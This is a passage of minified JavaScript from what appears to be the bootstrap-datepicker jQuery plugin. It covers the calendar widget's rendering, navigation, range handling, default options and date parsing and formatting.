                this.place(),
                this.picker.show(),
                this._attachSecondaryEvents(),
                this._trigger("show"),
                (window.navigator.msMaxTouchPoints || "ontouchstart"in document) && this.o.disableTouchKeyboard && a(this.element).blur(),
                this
        },
        hide: function() {
            return this.isInline || !this.picker.is(":visible") ? this : (this.focusDate = null,
            this.picker.hide().detach(),
            this._detachSecondaryEvents(),
            this.setViewMode(this.o.startView),
            this.o.forceParse && this.inputField.val() && this.setValue(),
            this._trigger("hide"),
            this)
        },
        destroy: function() {
            return this.hide(),
            this._detachEvents(),
            this._detachSecondaryEvents(),
            this.picker.remove(),
            delete this.element.data().datepicker,
            this.isInput || delete this.element.data().date,
            this
        },
        paste: function(b) {
            var c;
            if (b.originalEvent.clipboardData && b.originalEvent.clipboardData.types && a.inArray("text/plain", b.originalEvent.clipboardData.types) !== -1)
                c = b.originalEvent.clipboardData.getData("text/plain");
            else {
                if (!window.clipboardData)
                    return;
                c = window.clipboardData.getData("Text")
            }
            this.setDate(c),
            this.update(),
            b.preventDefault()
        },
        _utc_to_local: function(a) {
            if (!a)
                return a;
            var b = new Date(a.getTime() + 6e4 * a.getTimezoneOffset());
            return b.getTimezoneOffset() !== a.getTimezoneOffset() && (b = new Date(a.getTime() + 6e4 * b.getTimezoneOffset())),
            b
        },
        _local_to_utc: function(a) {
            return a && new Date(a.getTime() - 6e4 * a.getTimezoneOffset())
        },
        _zero_time: function(a) {
            return a && new Date(a.getFullYear(),a.getMonth(),a.getDate())
        },
        _zero_utc_time: function(a) {
            return a && c(a.getUTCFullYear(), a.getUTCMonth(), a.getUTCDate())
        },
        getDates: function() {
            return a.map(this.dates, this._utc_to_local)
        },
        getUTCDates: function() {
            return a.map(this.dates, function(a) {
                return new Date(a)
            })
        },
        getDate: function() {
            return this._utc_to_local(this.getUTCDate())
        },
        getUTCDate: function() {
            var a = this.dates.get(-1);
            return a !== b ? new Date(a) : null
        },
        clearDates: function() {
            this.inputField.val(""),
            this.update(),
            this._trigger("changeDate"),
            this.o.autoclose && this.hide()
        },
        setDates: function() {
            var b = a.isArray(arguments[0]) ? arguments[0] : arguments;
            return this.update.apply(this, b),
            this._trigger("changeDate"),
            this.setValue(),
            this
        },
        setUTCDates: function() {
            var b = a.isArray(arguments[0]) ? arguments[0] : arguments;
            return this.setDates.apply(this, a.map(b, this._utc_to_local)),
            this
        },
        setDate: f("setDates"),
        setUTCDate: f("setUTCDates"),
        remove: f("destroy", "Method `remove` is deprecated and will be removed in version 2.0. Use `destroy` instead"),
        setValue: function() {
            var a = this.getFormattedDate();
            return this.inputField.val(a),
            this
        },
        getFormattedDate: function(c) {
            c === b && (c = this.o.format);
            var d = this.o.language;
            return a.map(this.dates, function(a) {
                return r.formatDate(a, c, d)
            }).join(this.o.multidateSeparator)
        },
        getStartDate: function() {
            return this.o.startDate
        },
        setStartDate: function(a) {
            return this._process_options({
                startDate: a
            }),
            this.update(),
            this.updateNavArrows(),
            this
        },
        getEndDate: function() {
            return this.o.endDate
        },
        setEndDate: function(a) {
            return this._process_options({
                endDate: a
            }),
            this.update(),
            this.updateNavArrows(),
            this
        },
        setDaysOfWeekDisabled: function(a) {
            return this._process_options({
                daysOfWeekDisabled: a
            }),
            this.update(),
            this
        },
        setDaysOfWeekHighlighted: function(a) {
            return this._process_options({
                daysOfWeekHighlighted: a
            }),
            this.update(),
            this
        },
        setDatesDisabled: function(a) {
            return this._process_options({
                datesDisabled: a
            }),
            this.update(),
            this
        },
        place: function() {
            if (this.isInline)
                return this;
            var b = this.picker.outerWidth()
              , c = this.picker.outerHeight()
              , d = 10
              , e = a(this.o.container)
              , f = e.width()
              , g = "body" === this.o.container ? a(document).scrollTop() : e.scrollTop()
              , h = e.offset()
              , i = [0];
            this.element.parents().each(function() {
                var b = a(this).css("z-index");
                "auto" !== b && 0 !== Number(b) && i.push(Number(b))
            });
            var j = Math.max.apply(Math, i) + this.o.zIndexOffset
              , k = this.component ? this.component.parent().offset() : this.element.offset()
              , l = this.component ? this.component.outerHeight(!0) : this.element.outerHeight(!1)
              , m = this.component ? this.component.outerWidth(!0) : this.element.outerWidth(!1)
              , n = k.left - h.left
              , o = k.top - h.top;
            "body" !== this.o.container && (o += g),
            this.picker.removeClass("datepicker-orient-top datepicker-orient-bottom datepicker-orient-right datepicker-orient-left"),
            "auto" !== this.o.orientation.x ? (this.picker.addClass("datepicker-orient-" + this.o.orientation.x),
            "right" === this.o.orientation.x && (n -= b - m)) : k.left < 0 ? (this.picker.addClass("datepicker-orient-left"),
            n -= k.left - d) : n + b > f ? (this.picker.addClass("datepicker-orient-right"),
            n += m - b) : this.o.rtl ? this.picker.addClass("datepicker-orient-right") : this.picker.addClass("datepicker-orient-left");
            var p, q = this.o.orientation.y;
            if ("auto" === q && (p = -g + o - c,
            q = p < 0 ? "bottom" : "top"),
            this.picker.addClass("datepicker-orient-" + q),
            "top" === q ? o -= c + parseInt(this.picker.css("padding-top")) : o += l,
            this.o.rtl) {
                var r = f - (n + m);
                this.picker.css({
                    top: o,
                    right: r,
                    zIndex: j
                })
            } else
                this.picker.css({
                    top: o,
                    left: n,
                    zIndex: j
                });
            return this
        },
        _allow_update: !0,
        update: function() {
            if (!this._allow_update)
                return this;
            var b = this.dates.copy()
              , c = []
              , d = !1;
            return arguments.length ? (a.each(arguments, a.proxy(function(a, b) {
                b instanceof Date && (b = this._local_to_utc(b)),
                c.push(b)
            }, this)),
            d = !0) : (c = this.isInput ? this.element.val() : this.element.data("date") || this.inputField.val(),
            c = c && this.o.multidate ? c.split(this.o.multidateSeparator) : [c],
            delete this.element.data().date),
            c = a.map(c, a.proxy(function(a) {
                return r.parseDate(a, this.o.format, this.o.language, this.o.assumeNearbyYear)
            }, this)),
            c = a.grep(c, a.proxy(function(a) {
                return !this.dateWithinRange(a) || !a
            }, this), !0),
            this.dates.replace(c),
            this.o.updateViewDate && (this.dates.length ? this.viewDate = new Date(this.dates.get(-1)) : this.viewDate < this.o.startDate ? this.viewDate = new Date(this.o.startDate) : this.viewDate > this.o.endDate ? this.viewDate = new Date(this.o.endDate) : this.viewDate = this.o.defaultViewDate),
            d ? (this.setValue(),
            this.element.change()) : this.dates.length && String(b) !== String(this.dates) && d && (this._trigger("changeDate"),
            this.element.change()),
            !this.dates.length && b.length && (this._trigger("clearDate"),
            this.element.change()),
            this.fill(),
            this
        },
        fillDow: function() {
            if (this.o.showWeekDays) {
                var b = this.o.weekStart
                  , c = "<tr>";
                for (this.o.calendarWeeks && (c += '<th class="cw">&#160;</th>'); b < this.o.weekStart + 7; )
                    c += '<th class="dow',
                    a.inArray(b, this.o.daysOfWeekDisabled) !== -1 && (c += " disabled"),
                    c += '">' + q[this.o.language].daysMin[b++ % 7] + "</th>";
                c += "</tr>",
                this.picker.find(".datepicker-days thead").append(c)
            }
        },
        fillMonths: function() {
            for (var a, b = this._utc_to_local(this.viewDate), c = "", d = 0; d < 12; d++)
                a = b && b.getMonth() === d ? " focused" : "",
                c += '<span class="month' + a + '">' + q[this.o.language].monthsShort[d] + "</span>";
            this.picker.find(".datepicker-months td").html(c)
        },
        setRange: function(b) {
            b && b.length ? this.range = a.map(b, function(a) {
                return a.valueOf()
            }) : delete this.range,
            this.fill()
        },
        getClassNames: function(b) {
            var c = []
              , f = this.viewDate.getUTCFullYear()
              , g = this.viewDate.getUTCMonth()
              , h = d();
            return b.getUTCFullYear() < f || b.getUTCFullYear() === f && b.getUTCMonth() < g ? c.push("old") : (b.getUTCFullYear() > f || b.getUTCFullYear() === f && b.getUTCMonth() > g) && c.push("new"),
            this.focusDate && b.valueOf() === this.focusDate.valueOf() && c.push("focused"),
            this.o.todayHighlight && e(b, h) && c.push("today"),
            this.dates.contains(b) !== -1 && c.push("active"),
            this.dateWithinRange(b) || c.push("disabled"),
            this.dateIsDisabled(b) && c.push("disabled", "disabled-date"),
            a.inArray(b.getUTCDay(), this.o.daysOfWeekHighlighted) !== -1 && c.push("highlighted"),
            this.range && (b > this.range[0] && b < this.range[this.range.length - 1] && c.push("range"),
            a.inArray(b.valueOf(), this.range) !== -1 && c.push("selected"),
            b.valueOf() === this.range[0] && c.push("range-start"),
            b.valueOf() === this.range[this.range.length - 1] && c.push("range-end")),
            c
        },
        _fill_yearsView: function(c, d, e, f, g, h, i) {
            for (var j, k, l, m = "", n = e / 10, o = this.picker.find(c), p = Math.floor(f / e) * e, q = p + 9 * n, r = Math.floor(this.viewDate.getFullYear() / n) * n, s = a.map(this.dates, function(a) {
                return Math.floor(a.getUTCFullYear() / n) * n
            }), t = p - n; t <= q + n; t += n)
                j = [d],
                k = null,
                t === p - n ? j.push("old") : t === q + n && j.push("new"),
                a.inArray(t, s) !== -1 && j.push("active"),
                (t < g || t > h) && j.push("disabled"),
                t === r && j.push("focused"),
                i !== a.noop && (l = i(new Date(t,0,1)),
                l === b ? l = {} : "boolean" == typeof l ? l = {
                    enabled: l
                } : "string" == typeof l && (l = {
                    classes: l
                }),
                l.enabled === !1 && j.push("disabled"),
                l.classes && (j = j.concat(l.classes.split(/\s+/))),
                l.tooltip && (k = l.tooltip)),
                m += '<span class="' + j.join(" ") + '"' + (k ? ' title="' + k + '"' : "") + ">" + t + "</span>";
            o.find(".datepicker-switch").text(p + "-" + q),
            o.find("td").html(m)
        },
        fill: function() {
            var d, e, f = new Date(this.viewDate), g = f.getUTCFullYear(), h = f.getUTCMonth(), i = this.o.startDate !== -(1 / 0) ? this.o.startDate.getUTCFullYear() : -(1 / 0), j = this.o.startDate !== -(1 / 0) ? this.o.startDate.getUTCMonth() : -(1 / 0), k = this.o.endDate !== 1 / 0 ? this.o.endDate.getUTCFullYear() : 1 / 0, l = this.o.endDate !== 1 / 0 ? this.o.endDate.getUTCMonth() : 1 / 0, m = q[this.o.language].today || q.en.today || "", n = q[this.o.language].clear || q.en.clear || "", o = q[this.o.language].titleFormat || q.en.titleFormat;
            if (!isNaN(g) && !isNaN(h)) {
                this.picker.find(".datepicker-days .datepicker-switch").text(r.formatDate(f, o, this.o.language)),
                this.picker.find("tfoot .today").text(m).css("display", this.o.todayBtn === !0 || "linked" === this.o.todayBtn ? "table-cell" : "none"),
                this.picker.find("tfoot .clear").text(n).css("display", this.o.clearBtn === !0 ? "table-cell" : "none"),
                this.picker.find("thead .datepicker-title").text(this.o.title).css("display", "string" == typeof this.o.title && "" !== this.o.title ? "table-cell" : "none"),
                this.updateNavArrows(),
                this.fillMonths();
                var p = c(g, h, 0)
                  , s = p.getUTCDate();
                p.setUTCDate(s - (p.getUTCDay() - this.o.weekStart + 7) % 7);
                var t = new Date(p);
                p.getUTCFullYear() < 100 && t.setUTCFullYear(p.getUTCFullYear()),
                t.setUTCDate(t.getUTCDate() + 42),
                t = t.valueOf();
                for (var u, v, w = []; p.valueOf() < t; ) {
                    if (u = p.getUTCDay(),
                    u === this.o.weekStart && (w.push("<tr>"),
                    this.o.calendarWeeks)) {
                        var x = new Date(+p + (this.o.weekStart - u - 7) % 7 * 864e5)
                          , y = new Date(Number(x) + (11 - x.getUTCDay()) % 7 * 864e5)
                          , z = new Date(Number(z = c(y.getUTCFullYear(), 0, 1)) + (11 - z.getUTCDay()) % 7 * 864e5)
                          , A = (y - z) / 864e5 / 7 + 1;
                        w.push('<td class="cw">' + A + "</td>")
                    }
                    v = this.getClassNames(p),
                    v.push("day");
                    var B = p.getUTCDate();
                    this.o.beforeShowDay !== a.noop && (e = this.o.beforeShowDay(this._utc_to_local(p)),
                    e === b ? e = {} : "boolean" == typeof e ? e = {
                        enabled: e
                    } : "string" == typeof e && (e = {
                        classes: e
                    }),
                    e.enabled === !1 && v.push("disabled"),
                    e.classes && (v = v.concat(e.classes.split(/\s+/))),
                    e.tooltip && (d = e.tooltip),
                    e.content && (B = e.content)),
                    v = a.isFunction(a.uniqueSort) ? a.uniqueSort(v) : a.unique(v),
                    w.push('<td class="' + v.join(" ") + '"' + (d ? ' title="' + d + '"' : "") + ' data-date="' + p.getTime().toString() + '">' + B + "</td>"),
                    d = null,
                    u === this.o.weekEnd && w.push("</tr>"),
                    p.setUTCDate(p.getUTCDate() + 1)
                }
                this.picker.find(".datepicker-days tbody").html(w.join(""));
                var C = q[this.o.language].monthsTitle || q.en.monthsTitle || "Months"
                  , D = this.picker.find(".datepicker-months").find(".datepicker-switch").text(this.o.maxViewMode < 2 ? C : g).end().find("tbody span").removeClass("active");
                if (a.each(this.dates, function(a, b) {
                    b.getUTCFullYear() === g && D.eq(b.getUTCMonth()).addClass("active")
                }),
                (g < i || g > k) && D.addClass("disabled"),
                g === i && D.slice(0, j).addClass("disabled"),
                g === k && D.slice(l + 1).addClass("disabled"),
                this.o.beforeShowMonth !== a.noop) {
                    var E = this;
                    a.each(D, function(c, d) {
                        var e = new Date(g,c,1)
                          , f = E.o.beforeShowMonth(e);
                        f === b ? f = {} : "boolean" == typeof f ? f = {
                            enabled: f
                        } : "string" == typeof f && (f = {
                            classes: f
                        }),
                        f.enabled !== !1 || a(d).hasClass("disabled") || a(d).addClass("disabled"),
                        f.classes && a(d).addClass(f.classes),
                        f.tooltip && a(d).prop("title", f.tooltip)
                    })
                }
                this._fill_yearsView(".datepicker-years", "year", 10, g, i, k, this.o.beforeShowYear),
                this._fill_yearsView(".datepicker-decades", "decade", 100, g, i, k, this.o.beforeShowDecade),
                this._fill_yearsView(".datepicker-centuries", "century", 1e3, g, i, k, this.o.beforeShowCentury)
            }
        },
        updateNavArrows: function() {
            if (this._allow_update) {
                var a, b, c = new Date(this.viewDate), d = c.getUTCFullYear(), e = c.getUTCMonth(), f = this.o.startDate !== -(1 / 0) ? this.o.startDate.getUTCFullYear() : -(1 / 0), g = this.o.startDate !== -(1 / 0) ? this.o.startDate.getUTCMonth() : -(1 / 0), h = this.o.endDate !== 1 / 0 ? this.o.endDate.getUTCFullYear() : 1 / 0, i = this.o.endDate !== 1 / 0 ? this.o.endDate.getUTCMonth() : 1 / 0, j = 1;
                switch (this.viewMode) {
                case 4:
                    j *= 10;
                case 3:
                    j *= 10;
                case 2:
                    j *= 10;
                case 1:
                    a = Math.floor(d / j) * j < f,
                    b = Math.floor(d / j) * j + j > h;
                    break;
                case 0:
                    a = d <= f && e < g,
                    b = d >= h && e > i
                }
                this.picker.find(".prev").toggleClass("disabled", a),
                this.picker.find(".next").toggleClass("disabled", b)
            }
        },
        click: function(b) {
            b.preventDefault(),
            b.stopPropagation();
            var e, f, g, h;
            e = a(b.target),
            e.hasClass("datepicker-switch") && this.viewMode !== this.o.maxViewMode && this.setViewMode(this.viewMode + 1),
            e.hasClass("today") && !e.hasClass("day") && (this.setViewMode(0),
            this._setDate(d(), "linked" === this.o.todayBtn ? null : "view")),
            e.hasClass("clear") && this.clearDates(),
            e.hasClass("disabled") || (e.hasClass("month") || e.hasClass("year") || e.hasClass("decade") || e.hasClass("century")) && (this.viewDate.setUTCDate(1),
            f = 1,
            1 === this.viewMode ? (h = e.parent().find("span").index(e),
            g = this.viewDate.getUTCFullYear(),
            this.viewDate.setUTCMonth(h)) : (h = 0,
            g = Number(e.text()),
            this.viewDate.setUTCFullYear(g)),
            this._trigger(r.viewModes[this.viewMode - 1].e, this.viewDate),
            this.viewMode === this.o.minViewMode ? this._setDate(c(g, h, f)) : (this.setViewMode(this.viewMode - 1),
            this.fill())),
            this.picker.is(":visible") && this._focused_from && this._focused_from.focus(),
            delete this._focused_from
        },
        dayCellClick: function(b) {
            var c = a(b.currentTarget)
              , d = c.data("date")
              , e = new Date(d);
            this.o.updateViewDate && (e.getUTCFullYear() !== this.viewDate.getUTCFullYear() && this._trigger("changeYear", this.viewDate),
            e.getUTCMonth() !== this.viewDate.getUTCMonth() && this._trigger("changeMonth", this.viewDate)),
            this._setDate(e)
        },
        navArrowsClick: function(b) {
            var c = a(b.currentTarget)
              , d = c.hasClass("prev") ? -1 : 1;
            0 !== this.viewMode && (d *= 12 * r.viewModes[this.viewMode].navStep),
            this.viewDate = this.moveMonth(this.viewDate, d),
            this._trigger(r.viewModes[this.viewMode].e, this.viewDate),
            this.fill()
        },
        _toggle_multidate: function(a) {
            var b = this.dates.contains(a);
            if (a || this.dates.clear(),
            b !== -1 ? (this.o.multidate === !0 || this.o.multidate > 1 || this.o.toggleActive) && this.dates.remove(b) : this.o.multidate === !1 ? (this.dates.clear(),
            this.dates.push(a)) : this.dates.push(a),
            "number" == typeof this.o.multidate)
                for (; this.dates.length > this.o.multidate; )
                    this.dates.remove(0)
        },
        _setDate: function(a, b) {
            b && "date" !== b || this._toggle_multidate(a && new Date(a)),
            (!b && this.o.updateViewDate || "view" === b) && (this.viewDate = a && new Date(a)),
            this.fill(),
            this.setValue(),
            b && "view" === b || this._trigger("changeDate"),
            this.inputField.trigger("change"),
            !this.o.autoclose || b && "date" !== b || this.hide()
        },
        moveDay: function(a, b) {
            var c = new Date(a);
            return c.setUTCDate(a.getUTCDate() + b),
            c
        },
        moveWeek: function(a, b) {
            return this.moveDay(a, 7 * b)
        },
        moveMonth: function(a, b) {
            if (!g(a))
                return this.o.defaultViewDate;
            if (!b)
                return a;
            var c, d, e = new Date(a.valueOf()), f = e.getUTCDate(), h = e.getUTCMonth(), i = Math.abs(b);
            if (b = b > 0 ? 1 : -1,
            1 === i)
                d = b === -1 ? function() {
                    return e.getUTCMonth() === h
                }
                : function() {
                    return e.getUTCMonth() !== c
                }
                ,
                c = h + b,
                e.setUTCMonth(c),
                c = (c + 12) % 12;
            else {
                for (var j = 0; j < i; j++)
                    e = this.moveMonth(e, b);
                c = e.getUTCMonth(),
                e.setUTCDate(f),
                d = function() {
                    return c !== e.getUTCMonth()
                }
            }
            for (; d(); )
                e.setUTCDate(--f),
                e.setUTCMonth(c);
            return e
        },
        moveYear: function(a, b) {
            return this.moveMonth(a, 12 * b)
        },
        moveAvailableDate: function(a, b, c) {
            do {
                if (a = this[c](a, b),
                !this.dateWithinRange(a))
                    return !1;
                c = "moveDay"
            } while (this.dateIsDisabled(a));
            return a
        },
        weekOfDateIsDisabled: function(b) {
            return a.inArray(b.getUTCDay(), this.o.daysOfWeekDisabled) !== -1
        },
        dateIsDisabled: function(b) {
            return this.weekOfDateIsDisabled(b) || a.grep(this.o.datesDisabled, function(a) {
                return e(b, a)
            }).length > 0
        },
        dateWithinRange: function(a) {
            return a >= this.o.startDate && a <= this.o.endDate
        },
        keydown: function(a) {
            if (!this.picker.is(":visible"))
                return void (40 !== a.keyCode && 27 !== a.keyCode || (this.show(),
                a.stopPropagation()));
            var b, c, d = !1, e = this.focusDate || this.viewDate;
            switch (a.keyCode) {
            case 27:
                this.focusDate ? (this.focusDate = null,
                this.viewDate = this.dates.get(-1) || this.viewDate,
                this.fill()) : this.hide(),
                a.preventDefault(),
                a.stopPropagation();
                break;
            case 37:
            case 38:
            case 39:
            case 40:
                if (!this.o.keyboardNavigation || 7 === this.o.daysOfWeekDisabled.length)
                    break;
                b = 37 === a.keyCode || 38 === a.keyCode ? -1 : 1,
                0 === this.viewMode ? a.ctrlKey ? (c = this.moveAvailableDate(e, b, "moveYear"),
                c && this._trigger("changeYear", this.viewDate)) : a.shiftKey ? (c = this.moveAvailableDate(e, b, "moveMonth"),
                c && this._trigger("changeMonth", this.viewDate)) : 37 === a.keyCode || 39 === a.keyCode ? c = this.moveAvailableDate(e, b, "moveDay") : this.weekOfDateIsDisabled(e) || (c = this.moveAvailableDate(e, b, "moveWeek")) : 1 === this.viewMode ? (38 !== a.keyCode && 40 !== a.keyCode || (b *= 4),
                c = this.moveAvailableDate(e, b, "moveMonth")) : 2 === this.viewMode && (38 !== a.keyCode && 40 !== a.keyCode || (b *= 4),
                c = this.moveAvailableDate(e, b, "moveYear")),
                c && (this.focusDate = this.viewDate = c,
                this.setValue(),
                this.fill(),
                a.preventDefault());
                break;
            case 13:
                if (!this.o.forceParse)
                    break;
                e = this.focusDate || this.dates.get(-1) || this.viewDate,
                this.o.keyboardNavigation && (this._toggle_multidate(e),
                d = !0),
                this.focusDate = null,
                this.viewDate = this.dates.get(-1) || this.viewDate,
                this.setValue(),
                this.fill(),
                this.picker.is(":visible") && (a.preventDefault(),
                a.stopPropagation(),
                this.o.autoclose && this.hide());
                break;
            case 9:
                this.focusDate = null,
                this.viewDate = this.dates.get(-1) || this.viewDate,
                this.fill(),
                this.hide()
            }
            d && (this.dates.length ? this._trigger("changeDate") : this._trigger("clearDate"),
            this.inputField.trigger("change"))
        },
        setViewMode: function(a) {
            this.viewMode = a,
            this.picker.children("div").hide().filter(".datepicker-" + r.viewModes[this.viewMode].clsName).show(),
            this.updateNavArrows(),
            this._trigger("changeViewMode", new Date(this.viewDate))
        }
    };
    var l = function(b, c) {
        a.data(b, "datepicker", this),
        this.element = a(b),
        this.inputs = a.map(c.inputs, function(a) {
            return a.jquery ? a[0] : a
        }),
        delete c.inputs,
        this.keepEmptyValues = c.keepEmptyValues,
        delete c.keepEmptyValues,
        n.call(a(this.inputs), c).on("changeDate", a.proxy(this.dateUpdated, this)),
        this.pickers = a.map(this.inputs, function(b) {
            return a.data(b, "datepicker")
        }),
        this.updateDates()
    };
    l.prototype = {
        updateDates: function() {
            this.dates = a.map(this.pickers, function(a) {
                return a.getUTCDate()
            }),
            this.updateRanges()
        },
        updateRanges: function() {
            var b = a.map(this.dates, function(a) {
                return a.valueOf()
            });
            a.each(this.pickers, function(a, c) {
                c.setRange(b)
            })
        },
        clearDates: function() {
            a.each(this.pickers, function(a, b) {
                b.clearDates()
            })
        },
        dateUpdated: function(c) {
            if (!this.updating) {
                this.updating = !0;
                var d = a.data(c.target, "datepicker");
                if (d !== b) {
                    var e = d.getUTCDate()
                      , f = this.keepEmptyValues
                      , g = a.inArray(c.target, this.inputs)
                      , h = g - 1
                      , i = g + 1
                      , j = this.inputs.length;
                    if (g !== -1) {
                        if (a.each(this.pickers, function(a, b) {
                            b.getUTCDate() || b !== d && f || b.setUTCDate(e)
                        }),
                        e < this.dates[h])
                            for (; h >= 0 && e < this.dates[h]; )
                                this.pickers[h--].setUTCDate(e);
                        else if (e > this.dates[i])
                            for (; i < j && e > this.dates[i]; )
                                this.pickers[i++].setUTCDate(e);
                        this.updateDates(),
                        delete this.updating
                    }
                }
            }
        },
        destroy: function() {
            a.map(this.pickers, function(a) {
                a.destroy()
            }),
            a(this.inputs).off("changeDate", this.dateUpdated),
            delete this.element.data().datepicker
        },
        remove: f("destroy", "Method `remove` is deprecated and will be removed in version 2.0. Use `destroy` instead")
    };
    var m = a.fn.datepicker
      , n = function(c) {
        var d = Array.apply(null, arguments);
        d.shift();
        var e;
        if (this.each(function() {
            var b = a(this)
              , f = b.data("datepicker")
              , g = "object" == typeof c && c;
            if (!f) {
                var j = h(this, "date")
                  , m = a.extend({}, o, j, g)
                  , n = i(m.language)
                  , p = a.extend({}, o, n, j, g);
                b.hasClass("input-daterange") || p.inputs ? (a.extend(p, {
                    inputs: p.inputs || b.find("input").toArray()
                }),
                f = new l(this,p)) : f = new k(this,p),
                b.data("datepicker", f)
            }
            "string" == typeof c && "function" == typeof f[c] && (e = f[c].apply(f, d))
        }),
        e === b || e instanceof k || e instanceof l)
            return this;
        if (this.length > 1)
            throw new Error("Using only allowed for the collection of a single element (" + c + " function)");
        return e
    };
    a.fn.datepicker = n;
    var o = a.fn.datepicker.defaults = {
        assumeNearbyYear: !1,
        autoclose: !1,
        beforeShowDay: a.noop,
        beforeShowMonth: a.noop,
        beforeShowYear: a.noop,
        beforeShowDecade: a.noop,
        beforeShowCentury: a.noop,
        calendarWeeks: !1,
        clearBtn: !1,
        toggleActive: !1,
        daysOfWeekDisabled: [],
        daysOfWeekHighlighted: [],
        datesDisabled: [],
        endDate: 1 / 0,
        forceParse: !0,
        format: "mm/dd/yyyy",
        keepEmptyValues: !1,
        keyboardNavigation: !0,
        language: "en",
        minViewMode: 0,
        maxViewMode: 4,
        multidate: !1,
        multidateSeparator: ",",
        orientation: "auto",
        rtl: !1,
        startDate: -(1 / 0),
        startView: 0,
        todayBtn: !1,
        todayHighlight: !1,
        updateViewDate: !0,
        weekStart: 0,
        disableTouchKeyboard: !1,
        enableOnReadonly: !0,
        showOnFocus: !0,
        zIndexOffset: 10,
        container: "body",
        immediateUpdates: !1,
        title: "",
        templates: {
            leftArrow: "&#x00AB;",
            rightArrow: "&#x00BB;"
        },
        showWeekDays: !0
    }
      , p = a.fn.datepicker.locale_opts = ["format", "rtl", "weekStart"];
    a.fn.datepicker.Constructor = k;
    var q = a.fn.datepicker.dates = {
        en: {
            days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
            daysShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"],
            daysMin: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"],
            months: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
            monthsShort: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
            today: "Today",
            clear: "Clear",
            titleFormat: "MM yyyy"
        }
    }
      , r = {
        viewModes: [{
            names: ["days", "month"],
            clsName: "days",
            e: "changeMonth"
        }, {
            names: ["months", "year"],
            clsName: "months",
            e: "changeYear",
            navStep: 1
        }, {
            names: ["years", "decade"],
            clsName: "years",
            e: "changeDecade",
            navStep: 10
        }, {
            names: ["decades", "century"],
            clsName: "decades",
            e: "changeCentury",
            navStep: 100
        }, {
            names: ["centuries", "millennium"],
            clsName: "centuries",
            e: "changeMillennium",
            navStep: 1e3
        }],
        validParts: /dd?|DD?|mm?|MM?|yy(?:yy)?/g,
        nonpunctuation: /[^ -\/:-@\u5e74\u6708\u65e5\[-`{-~\t\n\r]+/g,
        parseFormat: function(a) {
            if ("function" == typeof a.toValue && "function" == typeof a.toDisplay)
                return a;
            var b = a.replace(this.validParts, "\0").split("\0")
              , c = a.match(this.validParts);
            if (!b || !b.length || !c || 0 === c.length)
                throw new Error("Invalid date format.");
            return {
                separators: b,
                parts: c
            }
        },
        parseDate: function(c, e, f, g) {
            function h(a, b) {
                return b === !0 && (b = 10),
                a < 100 && (a += 2e3,
                a > (new Date).getFullYear() + b && (a -= 100)),
                a
            }
            function i() {
                var a = this.slice(0, j[n].length)
                  , b = j[n].slice(0, a.length);
                return a.toLowerCase() === b.toLowerCase()
            }
            if (!c)
                return b;
            if (c instanceof Date)
                return c;
            if ("string" == typeof e && (e = r.parseFormat(e)),
            e.toValue)
                return e.toValue(c, e, f);
            var j, l, m, n, o, p = {
                d: "moveDay",
                m: "moveMonth",
                w: "moveWeek",
                y: "moveYear"
            }, s = {
                yesterday: "-1d",
                today: "+0d",
                tomorrow: "+1d"
            };
            if (c in s && (c = s[c]),
            /^[\-+]\d+[dmwy]([\s,]+[\-+]\d+[dmwy])*$/i.test(c)) {
                for (j = c.match(/([\-+]\d+)([dmwy])/gi),
                c = new Date,
                n = 0; n < j.length; n++)
                    l = j[n].match(/([\-+]\d+)([dmwy])/i),
                    m = Number(l[1]),
                    o = p[l[2].toLowerCase()],
                    c = k.prototype[o](c, m);
                return k.prototype._zero_utc_time(c)
            }
            j = c && c.match(this.nonpunctuation) || [];
            var t, u, v = {}, w = ["yyyy", "yy", "M", "MM", "m", "mm", "d", "dd"], x = {
                yyyy: function(a, b) {
                    return a.setUTCFullYear(g ? h(b, g) : b)
                },
                m: function(a, b) {
                    if (isNaN(a))
                        return a;
                    for (b -= 1; b < 0; )
                        b += 12;
                    for (b %= 12,
                    a.setUTCMonth(b); a.getUTCMonth() !== b; )
                        a.setUTCDate(a.getUTCDate() - 1);
                    return a
                },
                d: function(a, b) {
                    return a.setUTCDate(b)
                }
            };
            x.yy = x.yyyy,
            x.M = x.MM = x.mm = x.m,
            x.dd = x.d,
            c = d();
            var y = e.parts.slice();
            if (j.length !== y.length && (y = a(y).filter(function(b, c) {
                return a.inArray(c, w) !== -1
            }).toArray()),
            j.length === y.length) {
                var z;
                for (n = 0,
                z = y.length; n < z; n++) {
                    if (t = parseInt(j[n], 10),
                    l = y[n],
                    isNaN(t))
                        switch (l) {
                        case "MM":
                            u = a(q[f].months).filter(i),
                            t = a.inArray(u[0], q[f].months) + 1;
                            break;
                        case "M":
                            u = a(q[f].monthsShort).filter(i),
                            t = a.inArray(u[0], q[f].monthsShort) + 1
                        }
                    v[l] = t
                }
                var A, B;
                for (n = 0; n < w.length; n++)
                    B = w[n],
                    B in v && !isNaN(v[B]) && (A = new Date(c),
                    x[B](A, v[B]),
                    isNaN(A) || (c = A))
            }
            return c
        },
        formatDate: function(b, c, d) {
            if (!b)
                return "";
            if ("string" == typeof c && (c = r.parseFormat(c)),
            c.toDisplay)
                return c.toDisplay(b, c, d);
            var e = {
                d: b.getUTCDate(),
                D: q[d].daysShort[b.getUTCDay()],
                DD: q[d].days[b.getUTCDay()],
                m: b.getUTCMonth() + 1,
                M: q[d].monthsShort[b.getUTCMonth()],
                MM: q[d].months[b.getUTCMonth()],
                yy: b.getUTCFullYear().toString().substring(2),
                yyyy: b.getUTCFullYear()
            };
            e.dd = (e.d < 10 ? "0" : "") + e.d,
            e.mm = (e.m < 10 ? "0" : "") + e.m,
            b = [];
            for (var f = a.extend([], c.separators), g = 0, h = c.parts.length; g <= h; g++)
                f.length && b.push(f.shift()),
                b.push(e[c.parts[g]]);
            return b.join("")
        },
        headTemplate: '<thead><tr><th colspan="7" class="datepicker-title"></th></tr><tr><th class="prev">' + o.templates.leftArrow + '</th><th colspan="5" class="datepicker-switch"></th><th class="next">' + o.templates.rightArrow + "</th></tr></thead>",
        contTemplate: '<tbody><tr><td colspan="7"></td></tr></tbody>',
        footTemplate: '<tfoot><tr><th colspan="7" class="today"></th></tr><tr><th colspan="7" class="clear"></th></tr></tfoot>'
    };
